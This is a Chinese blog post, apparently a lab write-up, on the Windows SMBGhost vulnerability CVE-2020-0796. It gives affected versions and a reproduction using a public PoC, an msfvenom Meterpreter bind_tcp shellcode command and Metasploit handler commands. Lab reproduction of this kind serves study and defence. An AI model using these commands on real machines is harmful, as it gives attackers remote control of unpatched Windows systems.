**目录**

[CVE-2020-0796](#t0 "CVE-2020-0796")

[漏洞描述](#t1 "漏洞描述")

[漏洞危害等级](#t2 "漏洞危害等级        ")        

[影响版本](#t3 "影响版本")

[漏洞复现](#t4 "漏洞复现")

* * *

CVE-2020-0796
-------------

### **漏洞描述**

       2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。

### 漏洞危害等级        

**高**

### 影响版本

*   Windows 10 Version 1903 for 32-bit Systems
*   Windows 10 Version 1903 for x64-based Systems
*   Windows 10 Version 1903 for ARM64-based Systems
*   Windows Server, Version 1903 (Server Core installation)
*   Windows 10 Version 1909 for 32-bit Systems
*   Windows 10 Version 1909 for x64-based Systems
*   Windows 10 Version 1909 for ARM64-based Systems
*   Windows Server, Version 1909 (Server Core installation)

### 漏洞复现

*   靶机：192.168.10.26(Win10 1903版本)
*   Kali攻击机：192.168.10.13

![](https://img-blog.csdnimg.cn/20200605144807467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

POC地址：[https://github.com/chompie1337/SMBGhost\_RCE\_PoC](https://github.com/chompie1337/SMBGhost_RCE_PoC "https://github.com/chompie1337/SMBGhost_RCE_PoC")

先检测目标是否存在该漏洞

![](https://img-blog.csdnimg.cn/2020060514114614.png)

使用 msfvenom 生成 python 类型正向连接的 shellcode

```
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python
```


![](https://img-blog.csdnimg.cn/20200605143326720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

将生成的 shellcode 替换POC中exploit.py里的USER\_PAYLOAD字段，注意要将buf替换为USER\_PAYLOAD

![](https://img-blog.csdnimg.cn/2020060512310549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

MSF启动监听

```
use exploit/multi/handler      
set payload windows/x64/meterpreter/bind_tcp      
set lport 8888      
set rhost 192.168.10.26      
run
```


POC发起攻击，攻击成功

![](https://img-blog.csdnimg.cn/20200605143226790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

注意：在用POC打的过程中，极易出现蓝屏或重启的风险，使用时应注意！

![](https://img-blog.csdnimg.cn/20200605145015438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 实现本地提权

![](https://img-blog.csdnimg.cn/20200605141835725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

漏洞检测和利用脚本：关注微信公众号：xie\_sec ，后台回复：0796  即可下载。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)